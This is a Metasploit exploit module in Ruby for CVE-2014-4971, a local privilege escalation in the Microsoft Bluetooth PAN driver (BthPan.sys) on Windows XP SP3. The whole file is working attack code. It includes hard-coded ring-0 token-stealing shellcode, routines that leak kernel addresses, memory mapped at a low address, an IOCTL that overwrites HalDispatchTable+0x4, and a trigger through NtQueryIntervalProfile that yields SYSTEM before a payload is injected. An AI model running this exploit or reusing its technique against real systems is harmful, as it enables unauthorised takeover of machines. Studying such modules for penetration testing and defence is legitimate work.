##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/local/windows_kernel'
require 'rex'

class Metasploit3 < Msf::Exploit::Local
  Rank = AverageRanking

  include Msf::Exploit::Local::WindowsKernel
  include Msf::Post::File
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation',
      'Description'    => %q{
        A vulnerability within Microsoft Bluetooth Personal Area Networking module,
        BthPan.sys, can allow an attacker to inject memory controlled by the attacker
        into an arbitrary location. This can be used by an attacker to overwrite
        HalDispatchTable+0x4 and execute arbitrary code by subsequently calling
        NtQueryIntervalProfile.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Matt Bergin <level[at]korelogic.com>', # Vulnerability discovery and PoC
          'Jay Smith <jsmith[at]korelogic.com>' # MSF module
        ],
      'Arch'          => ARCH_X86,
      'Platform'      => 'win',
      'SessionTypes'  => [ 'meterpreter' ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Targets'       =>
        [
          ['Windows XP SP3',
           {
             'HaliQuerySystemInfo' => 0x16bba,
             '_KPROCESS'  => "\x44",
             '_TOKEN'     => "\xc8",
             '_UPID'      => "\x84",
             '_APLINKS'   => "\x88"
           }
          ]
        ],
      'References'    =>
        [
          [ 'CVE', '2014-4971' ],
          [ 'URL', 'https://www.korelogic.com/Resources/Advisories/KL-001-2014-002.txt' ],
          [ 'OSVDB', '109387' ]
        ],
      'DisclosureDate' => 'Jul 18 2014',
      'DefaultTarget'  => 0
    ))
  end


  def ring0_shellcode
    tokenswap = "\x60\x64\xA1\x24\x01\x00\x00"
    tokenswap << "\x8B\x40\x44\x50\xBB\x04"
    tokenswap << "\x00\x00\x00\x8B\x80\x88"
    tokenswap << "\x00\x00\x00\x2D\x88"
    tokenswap << "\x00\x00\x00\x39\x98\x84"
    tokenswap << "\x00\x00\x00\x75\xED\x8B\xB8\xC8"
    tokenswap << "\x00\x00\x00\x83\xE7\xF8\x58\xBB"
    tokenswap << [session.sys.process.getpid].pack('V')
    tokenswap << "\x8B\x80\x88\x00\x00\x00"
    tokenswap << "\x2D\x88\x00\x00\x00"
    tokenswap << "\x39\x98\x84\x00\x00\x00"
    tokenswap << "\x75\xED\x89\xB8\xC8"
    tokenswap << "\x00\x00\x00\x61\xC3"
  end

  def fill_memory(proc, address, length, content)
    session.railgun.ntdll.NtAllocateVirtualMemory(-1, [ address ].pack('V'), nil, [ length ].pack('V'), "MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN", "PAGE_EXECUTE_READWRITE")

    unless proc.memory.writable?(address)
      vprint_error("Failed to allocate memory")
      return nil
    end
    vprint_good("#{address} is now writable")

    result = proc.memory.write(address, content)

    if result.nil?
      vprint_error("Failed to write contents to memory")
      return nil
    end
    vprint_good("Contents successfully written to 0x#{address.to_s(16)}")

    return address
  end

  def disclose_addresses(t)
    addresses = {}

    hal_dispatch_table = find_haldispatchtable
    return nil if hal_dispatch_table.nil?
    addresses['halDispatchTable'] = hal_dispatch_table
    vprint_good("HalDispatchTable found at 0x#{addresses['halDispatchTable'].to_s(16)}")

    vprint_status('Getting the hal.dll base address...')
    hal_info = find_sys_base('hal.dll')
    if hal_info.nil?
      vprint_error('Failed to disclose hal.dll base address')
      return nil
    end
    hal_base = hal_info[0]
    vprint_good("hal.dll base address disclosed at 0x#{hal_base.to_s(16)}")

    hali_query_system_information = hal_base + t['HaliQuerySystemInfo']
    addresses['HaliQuerySystemInfo'] = hali_query_system_information

    vprint_good("HaliQuerySystemInfo address disclosed at 0x#{addresses['HaliQuerySystemInfo'].to_s(16)}")
    addresses
  end

  def check
    if sysinfo["Architecture"] =~ /wow64/i || sysinfo["Architecture"] =~ /x64/
      return Exploit::CheckCode::Safe
    end

    os = sysinfo["OS"]
    return Exploit::CheckCode::Safe unless os =~ /windows xp.*service pack 3/i

    handle = open_device("\\\\.\\bthpan", 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')
    return Exploit::CheckCode::Safe unless handle

    session.railgun.kernel32.CloseHandle(handle)

    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    if is_system?
      fail_with(Exploit::Failure::None, 'Session is already elevated')
    end

    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system")
    end

    handle = open_device("\\\\.\\bthpan", 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')
    if handle.nil?
      fail_with(Failure::NoTarget, "Unable to open \\\\.\\bthpan device")
    end

    my_target = targets[0]
    print_status("Disclosing the HalDispatchTable address...")
    @addresses = disclose_addresses(my_target)
    if @addresses.nil?
      session.railgun.kernel32.CloseHandle(handle)
      fail_with(Failure::Unknown, "Failed to disclose necessary address for exploitation. Aborting.")
    else
      print_good("Address successfully disclosed.")
    end

    print_status("Storing the shellcode in memory...")
    this_proc = session.sys.process.open
    kernel_shell = ring0_shellcode
    kernel_shell_address = 0x1

    buf = "\x90" * 0x6000
    buf[0, 1028] = "\x50\x00\x00\x00" + "\x90" * 0x400
    buf[0x5000, kernel_shell.length] = kernel_shell

    result = fill_memory(this_proc, kernel_shell_address, buf.length, buf)
    if result.nil?
      session.railgun.kernel32.CloseHandle(handle)
      fail_with(Failure::Unknown, "Error while storing the kernel stager shellcode on memory")
    end
    print_good("Kernel stager successfully stored at 0x#{kernel_shell_address.to_s(16)}")

    print_status("Triggering the vulnerability, corrupting the HalDispatchTable...")
    session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x0012d814, 0x1, 0x258, @addresses["halDispatchTable"] + 0x4, 0)
    session.railgun.kernel32.CloseHandle(handle)

    print_status("Executing the Kernel Stager throw NtQueryIntervalProfile()...")
    session.railgun.ntdll.NtQueryIntervalProfile(2, 4)

    print_status("Checking privileges after exploitation...")

    unless is_system?
      fail_with(Failure::Unknown, "The privilege escalation wasn't successful")
    end
    print_good("Privilege escalation successful!")

    p = payload.encoded
    print_status("Injecting #{p.length} bytes to memory and executing it...")
    unless execute_shellcode(p)
      fail_with(Failure::Unknown, "Error while executing the payload")
    end
  end
end

